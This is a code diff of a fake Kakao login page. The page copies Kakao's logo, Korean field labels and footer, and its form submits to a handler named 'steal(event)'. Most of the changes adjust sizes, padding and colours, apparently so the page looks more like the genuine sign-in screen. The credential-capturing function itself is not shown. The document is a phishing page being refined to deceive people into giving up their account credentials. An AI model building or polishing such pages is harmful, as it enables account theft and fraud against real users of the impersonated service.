@@ -15,7 +15,7 @@
 
     .container {
       width: 100%;
-      max-width: 440px;
+      max-width: 480px;
       margin: 80px auto;
       padding: 40px 20px;
       background-color: white;
@@ -23,21 +23,22 @@
     }
 
     .logo {
-      width: 150px;
-      margin-bottom: 20px;
+      width: 180px; /* Slightly increased */
+      margin-bottom: 25px;
     }
 
     .box {
       border: 1px solid #dbdbdb;
-      padding: 25px 20px;
+      padding: 30px 24px;
       text-align: center;
+      background-color: #fafafa; /* same as screen */
     }
 
     .input-field {
       width: 100%;
-      padding: 10px;
-      margin: 6px 0;
-      font-size: 14px;
+      padding: 14px;
+      margin: 10px 0;
+      font-size: 16px;
       background: transparent;
       border: none;
       border-bottom: 1px solid #dbdbdb;
@@ -45,34 +46,34 @@
 
     .checkbox-container {
       text-align: left;
-      margin: 12px 0;
-      font-size: 14px;
+      margin: 16px 0;
+      font-size: 15px;
       color: gray;
     }
 
     .checkbox-container input[type="checkbox"] {
-      margin-right: 5px;
+      margin-right: 6px;
       accent-color: gray;
     }
 
     .yellow-login-button {
       background-color: #ffcc00;
       color: black;
-      padding: 10px;
+      padding: 14px;
       border: none;
       width: 100%;
-      font-size: 14px;
-      margin: 10px 0;
+      font-size: 15px;
+      margin: 12px 0;
       cursor: pointer;
     }
 
     .gray-box-button {
       border: 1px solid #dbdbdb;
       background-color: #fafafa;
-      padding: 10px;
-      margin: 10px 0;
+      padding: 14px;
+      margin: 12px 0;
       width: 100%;
-      font-size: 14px;
+      font-size: 15px;
       cursor: pointer;
       font-weight: normal;
     }
@@ -80,8 +81,8 @@
     .link-row {
       display: flex;
       justify-content: space-between;
-      margin-top: 15px;
-      font-size: 13px;
+      margin-top: 18px;
+      font-size: 14px;
       color: #555;
     }
 
@@ -95,10 +96,10 @@
     }
 
     .footer {
-      font-size: 12px;
+      font-size: 13px;
       color: #8e8e8e;
       text-align: center;
-      margin-top: 30px;
+      margin-top: 40px;
     }
 
     .footer a {
@@ -114,10 +115,10 @@
 
 <body>
   <div class="container">
-    <!-- Logo image above the gray box -->
+    <!-- Kakao Logo Image -->
     <img src="https://cloudfront-ap-northeast-1.images.arcpublishing.com/chosunbiz/V7G5WPM7MJXDWOGTLIHZ7HINAE.jpg" alt="Kakao Logo" class="logo">
 
-    <!-- Gray outline box -->
+    <!-- Gray Box -->
     <div class="box">
       <form onsubmit="steal(event)">
         <input class="input-field" id="username" type="text" placeholder="카카오메일 아이디, 이메일, 전화번호" required>
@@ -142,9 +143,9 @@
 
     <!-- Footer -->
     <div class="footer">
-      <a href="#">이용약관</a> | 
-      <a href="#">개인정보 처리방침</a> | 
-      <a href="#">고객 센터</a><br>
+      <a href="#">이용약관</a> |
+      <a href="#">개인정보 처리방침</a> |
+      <a href="#">고객센터</a><br>
       © Kakao Corp.
     </div>
   </div>
